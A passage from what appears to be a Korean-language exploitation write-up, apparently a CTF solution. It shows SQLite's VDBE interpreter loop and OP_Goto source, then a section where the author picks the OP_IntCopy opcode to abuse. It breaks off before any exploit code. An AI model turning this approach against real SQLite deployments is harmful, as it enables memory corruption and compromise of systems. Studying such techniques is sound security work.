</span></span><span style="display:flex;"><span><span style="color:#75715e">#if defined(SQLITE_ENABLE_STMT_SCANSTATUS) || defined(VDBE_PROFILE)
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  u64 <span style="color:#f92672">*</span>pnCycle <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> bStmtScanStatus <span style="color:#f92672">=</span> <span style="color:#a6e22e">IS_STMT_SCANSTATUS</span>(db)<span style="color:#f92672">!=</span><span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span><span style="color:#75715e">#endif
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#75715e">/*** INSERT STACK UNION HERE ***/</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">assert</span>( p<span style="color:#f92672">-&gt;</span>eVdbeState<span style="color:#f92672">==</span>VDBE_RUN_STATE );  <span style="color:#75715e">/* sqlite3_step() verifies this */</span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span>( <span style="color:#a6e22e">DbMaskNonZero</span>(p<span style="color:#f92672">-&gt;</span>lockMask) ){
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">sqlite3VdbeEnter</span>(p);
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span><span style="color:#75715e">#ifndef SQLITE_OMIT_PROGRESS_CALLBACK
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">if</span>( db<span style="color:#f92672">-&gt;</span>xProgress ){
</span></span><span style="display:flex;"><span>    u32 iPrior <span style="color:#f92672">=</span> p<span style="color:#f92672">-&gt;</span>aCounter[SQLITE_STMTSTATUS_VM_STEP];
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">assert</span>( <span style="color:#ae81ff">0</span> <span style="color:#f92672">&lt;</span> db<span style="color:#f92672">-&gt;</span>nProgressOps );
</span></span><span style="display:flex;"><span>    nProgressLimit <span style="color:#f92672">=</span> db<span style="color:#f92672">-&gt;</span>nProgressOps <span style="color:#f92672">-</span> (iPrior <span style="color:#f92672">%</span> db<span style="color:#f92672">-&gt;</span>nProgressOps);
</span></span><span style="display:flex;"><span>  }<span style="color:#66d9ef">else</span>{
</span></span><span style="display:flex;"><span>    nProgressLimit <span style="color:#f92672">=</span> LARGEST_UINT64;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span><span style="color:#75715e">#endif
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">if</span>( p<span style="color:#f92672">-&gt;</span>rc<span style="color:#f92672">==</span>SQLITE_NOMEM ){
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">/* This happens if a malloc() inside a call to sqlite3_column_text() or
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">    ** sqlite3_column_text16() failed.  */</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">goto</span> no_mem;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">assert</span>( p<span style="color:#f92672">-&gt;</span>rc<span style="color:#f92672">==</span>SQLITE_OK <span style="color:#f92672">||</span> (p<span style="color:#f92672">-&gt;</span>rc<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xff</span>)<span style="color:#f92672">==</span>SQLITE_BUSY );
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">testcase</span>( p<span style="color:#f92672">-&gt;</span>rc<span style="color:#f92672">!=</span>SQLITE_OK );
</span></span><span style="display:flex;"><span>  p<span style="color:#f92672">-&gt;</span>rc <span style="color:#f92672">=</span> SQLITE_OK;
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">assert</span>( p<span style="color:#f92672">-&gt;</span>bIsReader <span style="color:#f92672">||</span> p<span style="color:#f92672">-&gt;</span>readOnly<span style="color:#f92672">!=</span><span style="color:#ae81ff">0</span> );
</span></span><span style="display:flex;"><span>  p<span style="color:#f92672">-&gt;</span>iCurrentTime <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">assert</span>( p<span style="color:#f92672">-&gt;</span>explain<span style="color:#f92672">==</span><span style="color:#ae81ff">0</span> );
</span></span><span style="display:flex;"><span>  db<span style="color:#f92672">-&gt;</span>busyHandler.nBusy <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span>( <span style="color:#a6e22e">AtomicLoad</span>(<span style="color:#f92672">&amp;</span>db<span style="color:#f92672">-&gt;</span>u1.isInterrupted) ) <span style="color:#66d9ef">goto</span> abort_due_to_interrupt;
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">sqlite3VdbeIOTraceSql</span>(p);
</span></span><span style="display:flex;"><span><span style="color:#75715e">#ifdef SQLITE_DEBUG
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#a6e22e">sqlite3BeginBenignMalloc</span>();
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span>( p<span style="color:#f92672">-&gt;</span>pc<span style="color:#f92672">==</span><span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>   <span style="color:#f92672">&amp;&amp;</span> (p<span style="color:#f92672">-&gt;</span>db<span style="color:#f92672">-&gt;</span>flags <span style="color:#f92672">&amp;</span> (SQLITE_VdbeListing<span style="color:#f92672">|</span>SQLITE_VdbeEQP<span style="color:#f92672">|</span>SQLITE_VdbeTrace))<span style="color:#f92672">!=</span><span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>  ){
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">int</span> i;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">int</span> once <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">sqlite3VdbePrintSql</span>(p);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span>( p<span style="color:#f92672">-&gt;</span>db<span style="color:#f92672">-&gt;</span>flags <span style="color:#f92672">&amp;</span> SQLITE_VdbeListing ){
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;VDBE Program Listing:</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">for</span>(i<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>; i<span style="color:#f92672">&lt;</span>p<span style="color:#f92672">-&gt;</span>nOp; i<span style="color:#f92672">++</span>){
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">sqlite3VdbePrintOp</span>(stdout, i, <span style="color:#f92672">&amp;</span>aOp[i]);
</span></span><span style="display:flex;"><span>      }
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span>( p<span style="color:#f92672">-&gt;</span>db<span style="color:#f92672">-&gt;</span>flags <span style="color:#f92672">&amp;</span> SQLITE_VdbeEQP ){
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">for</span>(i<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>; i<span style="color:#f92672">&lt;</span>p<span style="color:#f92672">-&gt;</span>nOp; i<span style="color:#f92672">++</span>){
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span>( aOp[i].opcode<span style="color:#f92672">==</span>OP_Explain ){
</span></span><span style="display:flex;"><span>          <span style="color:#66d9ef">if</span>( once ) <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;VDBE Query Plan:</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
</span></span><span style="display:flex;"><span>          <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;%s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, aOp[i].p4.z);
</span></span><span style="display:flex;"><span>          once <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>      }
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span>( p<span style="color:#f92672">-&gt;</span>db<span style="color:#f92672">-&gt;</span>flags <span style="color:#f92672">&amp;</span> SQLITE_VdbeTrace )  <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;VDBE Trace:</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">sqlite3EndBenignMalloc</span>();
</span></span><span style="display:flex;"><span><span style="color:#75715e">#endif
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">for</span>(pOp<span style="color:#f92672">=&amp;</span>aOp[p<span style="color:#f92672">-&gt;</span>pc]; <span style="color:#ae81ff">1</span>; pOp<span style="color:#f92672">++</span>){
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">/* Errors are detected by individual opcodes, with an immediate
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">    ** jumps to abort_due_to_error. */</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">assert</span>( rc<span style="color:#f92672">==</span>SQLITE_OK );
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">assert</span>( pOp<span style="color:#f92672">&gt;=</span>aOp <span style="color:#f92672">&amp;&amp;</span> pOp<span style="color:#f92672">&lt;&amp;</span>aOp[p<span style="color:#f92672">-&gt;</span>nOp]);
</span></span><span style="display:flex;"><span>    nVmStep<span style="color:#f92672">++</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#if defined(VDBE_PROFILE)
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    pOp<span style="color:#f92672">-&gt;</span>nExec<span style="color:#f92672">++</span>;
</span></span><span style="display:flex;"><span>    pnCycle <span style="color:#f92672">=</span> <span style="color:#f92672">&amp;</span>pOp<span style="color:#f92672">-&gt;</span>nCycle;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span>( sqlite3NProfileCnt<span style="color:#f92672">==</span><span style="color:#ae81ff">0</span> ) <span style="color:#f92672">*</span>pnCycle <span style="color:#f92672">-=</span> <span style="color:#a6e22e">sqlite3Hwtime</span>();
</span></span><span style="display:flex;"><span><span style="color:#75715e">#elif defined(SQLITE_ENABLE_STMT_SCANSTATUS)
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">if</span>( bStmtScanStatus ){
</span></span><span style="display:flex;"><span>      pOp<span style="color:#f92672">-&gt;</span>nExec<span style="color:#f92672">++</span>;
</span></span><span style="display:flex;"><span>      pnCycle <span style="color:#f92672">=</span> <span style="color:#f92672">&amp;</span>pOp<span style="color:#f92672">-&gt;</span>nCycle;
</span></span><span style="display:flex;"><span>      <span style="color:#f92672">*</span>pnCycle <span style="color:#f92672">-=</span> <span style="color:#a6e22e">sqlite3Hwtime</span>();
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span><span style="color:#75715e">#endif
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">/* Only allow tracing if SQLITE_DEBUG is defined.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">    */</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#ifdef SQLITE_DEBUG
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">if</span>( db<span style="color:#f92672">-&gt;</span>flags <span style="color:#f92672">&amp;</span> SQLITE_VdbeTrace ){
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">sqlite3VdbePrintOp</span>(stdout, (<span style="color:#66d9ef">int</span>)(pOp <span style="color:#f92672">-</span> aOp), pOp);
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">test_trace_breakpoint</span>((<span style="color:#66d9ef">int</span>)(pOp <span style="color:#f92672">-</span> aOp),pOp,p);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span><span style="color:#75715e">#endif
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">/* Check to see if we need to simulate an interrupt.  This only happens
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">    ** if we have a special test build.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">    */</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#ifdef SQLITE_TEST
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">if</span>( sqlite3_interrupt_count<span style="color:#f92672">&gt;</span><span style="color:#ae81ff">0</span> ){
</span></span><span style="display:flex;"><span>      sqlite3_interrupt_count<span style="color:#f92672">--</span>;
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span>( sqlite3_interrupt_count<span style="color:#f92672">==</span><span style="color:#ae81ff">0</span> ){
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">sqlite3_interrupt</span>(db);
</span></span><span style="display:flex;"><span>      }
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span><span style="color:#75715e">#endif
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">/* Sanity checking on other operands */</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#ifdef SQLITE_DEBUG
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    {
</span></span><span style="display:flex;"><span>      u8 opProperty <span style="color:#f92672">=</span> sqlite3OpcodeProperty[pOp<span style="color:#f92672">-&gt;</span>opcode];
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span>( (opProperty <span style="color:#f92672">&amp;</span> OPFLG_IN1)<span style="color:#f92672">!=</span><span style="color:#ae81ff">0</span> ){
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">assert</span>( pOp<span style="color:#f92672">-&gt;</span>p1<span style="color:#f92672">&gt;</span><span style="color:#ae81ff">0</span> );
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">assert</span>( pOp<span style="color:#f92672">-&gt;</span>p1<span style="color:#f92672">&lt;=</span>(p<span style="color:#f92672">-&gt;</span>nMem<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span> <span style="color:#f92672">-</span> p<span style="color:#f92672">-&gt;</span>nCursor) );
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">assert</span>( <span style="color:#a6e22e">memIsValid</span>(<span style="color:#f92672">&amp;</span>aMem[pOp<span style="color:#f92672">-&gt;</span>p1]) );
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">assert</span>( <span style="color:#a6e22e">sqlite3VdbeCheckMemInvariants</span>(<span style="color:#f92672">&amp;</span>aMem[pOp<span style="color:#f92672">-&gt;</span>p1]) );
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">REGISTER_TRACE</span>(pOp<span style="color:#f92672">-&gt;</span>p1, <span style="color:#f92672">&amp;</span>aMem[pOp<span style="color:#f92672">-&gt;</span>p1]);
</span></span><span style="display:flex;"><span>      }
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span>( (opProperty <span style="color:#f92672">&amp;</span> OPFLG_IN2)<span style="color:#f92672">!=</span><span style="color:#ae81ff">0</span> ){
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">assert</span>( pOp<span style="color:#f92672">-&gt;</span>p2<span style="color:#f92672">&gt;</span><span style="color:#ae81ff">0</span> );
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">assert</span>( pOp<span style="color:#f92672">-&gt;</span>p2<span style="color:#f92672">&lt;=</span>(p<span style="color:#f92672">-&gt;</span>nMem<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span> <span style="color:#f92672">-</span> p<span style="color:#f92672">-&gt;</span>nCursor) );
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">assert</span>( <span style="color:#a6e22e">memIsValid</span>(<span style="color:#f92672">&amp;</span>aMem[pOp<span style="color:#f92672">-&gt;</span>p2]) );
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">assert</span>( <span style="color:#a6e22e">sqlite3VdbeCheckMemInvariants</span>(<span style="color:#f92672">&amp;</span>aMem[pOp<span style="color:#f92672">-&gt;</span>p2]) );
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">REGISTER_TRACE</span>(pOp<span style="color:#f92672">-&gt;</span>p2, <span style="color:#f92672">&amp;</span>aMem[pOp<span style="color:#f92672">-&gt;</span>p2]);
</span></span><span style="display:flex;"><span>      }
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span>( (opProperty <span style="color:#f92672">&amp;</span> OPFLG_IN3)<span style="color:#f92672">!=</span><span style="color:#ae81ff">0</span> ){
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">assert</span>( pOp<span style="color:#f92672">-&gt;</span>p3<span style="color:#f92672">&gt;</span><span style="color:#ae81ff">0</span> );
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">assert</span>( pOp<span style="color:#f92672">-&gt;</span>p3<span style="color:#f92672">&lt;=</span>(p<span style="color:#f92672">-&gt;</span>nMem<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span> <span style="color:#f92672">-</span> p<span style="color:#f92672">-&gt;</span>nCursor) );
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">assert</span>( <span style="color:#a6e22e">memIsValid</span>(<span style="color:#f92672">&amp;</span>aMem[pOp<span style="color:#f92672">-&gt;</span>p3]) );
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">assert</span>( <span style="color:#a6e22e">sqlite3VdbeCheckMemInvariants</span>(<span style="color:#f92672">&amp;</span>aMem[pOp<span style="color:#f92672">-&gt;</span>p3]) );
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">REGISTER_TRACE</span>(pOp<span style="color:#f92672">-&gt;</span>p3, <span style="color:#f92672">&amp;</span>aMem[pOp<span style="color:#f92672">-&gt;</span>p3]);
</span></span><span style="display:flex;"><span>      }
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span>( (opProperty <span style="color:#f92672">&amp;</span> OPFLG_OUT2)<span style="color:#f92672">!=</span><span style="color:#ae81ff">0</span> ){
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">assert</span>( pOp<span style="color:#f92672">-&gt;</span>p2<span style="color:#f92672">&gt;</span><span style="color:#ae81ff">0</span> );
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">assert</span>( pOp<span style="color:#f92672">-&gt;</span>p2<span style="color:#f92672">&lt;=</span>(p<span style="color:#f92672">-&gt;</span>nMem<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span> <span style="color:#f92672">-</span> p<span style="color:#f92672">-&gt;</span>nCursor) );
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">memAboutToChange</span>(p, <span style="color:#f92672">&amp;</span>aMem[pOp<span style="color:#f92672">-&gt;</span>p2]);
</span></span><span style="display:flex;"><span>      }
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span>( (opProperty <span style="color:#f92672">&amp;</span> OPFLG_OUT3)<span style="color:#f92672">!=</span><span style="color:#ae81ff">0</span> ){
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">assert</span>( pOp<span style="color:#f92672">-&gt;</span>p3<span style="color:#f92672">&gt;</span><span style="color:#ae81ff">0</span> );
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">assert</span>( pOp<span style="color:#f92672">-&gt;</span>p3<span style="color:#f92672">&lt;=</span>(p<span style="color:#f92672">-&gt;</span>nMem<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span> <span style="color:#f92672">-</span> p<span style="color:#f92672">-&gt;</span>nCursor) );
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">memAboutToChange</span>(p, <span style="color:#f92672">&amp;</span>aMem[pOp<span style="color:#f92672">-&gt;</span>p3]);
</span></span><span style="display:flex;"><span>      }
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span><span style="color:#75715e">#endif
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#ifdef SQLITE_DEBUG
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    pOrigOp <span style="color:#f92672">=</span> pOp;
</span></span><span style="display:flex;"><span><span style="color:#75715e">#endif
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">switch</span>( pOp<span style="color:#f92672">-&gt;</span>opcode ){
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">/*****************************************************************************
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">** What follows is a massive switch statement where each case implements a
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">** separate instruction in the virtual machine.  If we follow the usual
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">** indentation conventions, each case should be indented by 6 spaces.  But
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">** that is a lot of wasted space on the left margin.  So the code within
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">** the switch statement will break with convention and be flush-left. Another
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">** big comment (similar to this one) will mark the point in the code where
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">** we transition back to normal indentation.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">**
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">** The formatting of each case is important.  The makefile for SQLite
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">** generates two C files &#34;opcodes.h&#34; and &#34;opcodes.c&#34; by scanning this
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">** file looking for lines that begin with &#34;case OP_&#34;.  The opcodes.h files
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">** will be filled with #defines that give unique integer values to each
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">** opcode and the opcodes.c file is filled with an array of strings where
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">** each string is the symbolic name for the corresponding opcode.  If the
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">** case statement is followed by a comment of the form &#34;/# same as ... #/&#34;
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">** that comment is used to determine the particular value of the opcode.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">**
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">** Other keywords in the comment that follows each case are used to
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">** construct the OPFLG_INITIALIZER value that initializes opcodeProperty[].
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">** Keywords include: in1, in2, in3, out2, out3.  See
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">** the mkopcodeh.awk script for additional information.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">**
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">** Documentation about VDBE opcodes is generated by scanning this file
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">** for lines of that contain &#34;Opcode:&#34;.  That line and all subsequent
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">** comment lines are used in the generation of the opcode.html documentation
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">** file.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">**
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">** SUMMARY:
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">**
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">**     Formatting is important to scripts that scan this file.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">**     Do not deviate from the formatting style currently in use.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">**
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">*****************************************************************************/</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">/* Opcode:  Goto * P2 * * *
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">**
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">** An unconditional jump to address P2.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">** The next instruction executed will be
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">** the one at index P2 from the beginning of
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">** the program.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">**
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">** The P1 parameter is not actually used by this opcode.  However, it
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">** is sometimes set to 1 instead of 0 as a hint to the command-line shell
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">** that this Goto is the bottom of a loop and that the lines from P2 down
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">** to the current line should be indented for EXPLAIN output.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">*/</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">case</span> OP_Goto: {             <span style="color:#75715e">/* jump */</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#ifdef SQLITE_DEBUG
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#75715e">/* In debugging mode, when the p5 flags is set on an OP_Goto, that
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">  ** means we should really jump back to the preceding OP_ReleaseReg
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">  ** instruction. */</span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span>( pOp<span style="color:#f92672">-&gt;</span>p5 ){
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">assert</span>( pOp<span style="color:#f92672">-&gt;</span>p2 <span style="color:#f92672">&lt;</span> (<span style="color:#66d9ef">int</span>)(pOp <span style="color:#f92672">-</span> aOp) );
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">assert</span>( pOp<span style="color:#f92672">-&gt;</span>p2 <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">1</span> );
</span></span><span style="display:flex;"><span>    pOp <span style="color:#f92672">=</span> <span style="color:#f92672">&amp;</span>aOp[pOp<span style="color:#f92672">-&gt;</span>p2 <span style="color:#f92672">-</span> <span style="color:#ae81ff">2</span>];
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">assert</span>( pOp[<span style="color:#ae81ff">1</span>].opcode<span style="color:#f92672">==</span>OP_ReleaseReg );
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">goto</span> check_for_interrupt;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span><span style="color:#75715e">#endif
</span></span></span></code></pre></div><p>이런식으로 Opcode에 따라 switch case로 처리한다.</p>
<h2 id="exploitation">Exploitation<a hidden class="anchor" aria-hidden="true" href="#exploitation">#</a></h2>
<p>먼저 악용할만한 opcode를 먼저 찾으려고 주석으로 달린 synopsis를 읽었다.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>OP_Copy          <span style="color:#f92672">=</span> <span style="color:#ae81ff">80</span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#75715e">/* synopsis: r[P2@P3+1]=r[P1@P3+1]            */</span>
</span></span><span style="display:flex;"><span>OP_SCopy         <span style="color:#f92672">=</span> <span style="color:#ae81ff">81</span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#75715e">/* synopsis: r[P2]=r[P1]                      */</span>
</span></span><span style="display:flex;"><span>OP_IntCopy       <span style="color:#f92672">=</span> <span style="color:#ae81ff">82</span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#75715e">/* synopsis: r[P2]=r[P1]     
</span></span></span></code></pre></div><p>Copy 계열 명령어를 보다가 IntCopy를 쓰기로 결정했다.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">/* Opcode: IntCopy P1 P2 * * *
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">** Synopsis: r[P2]=r[P1]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">**
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">** Transfer the integer value held in register P1 into register P2.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">**
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">** This is an optimized version of SCopy that works only for integer
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">** values.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">*/</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">case</span> OP_IntCopy: {            <span style="color:#75715e">/* out2 */</span>
</span></span><span style="display:flex;"><span>  pIn1 <span style="color:#f92672">=</span> <span style="color:#f92672">&amp;</span>aMem[pOp<span style="color:#f92672">-&gt;</span>p1];
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">assert</span>( (pIn1<span style="color:#f92672">-&gt;</span>flags <span style="color:#f92672">&amp;</span> MEM_Int)<span style="color:#f92672">!=</span><span style="color:#ae81ff">0</span> );
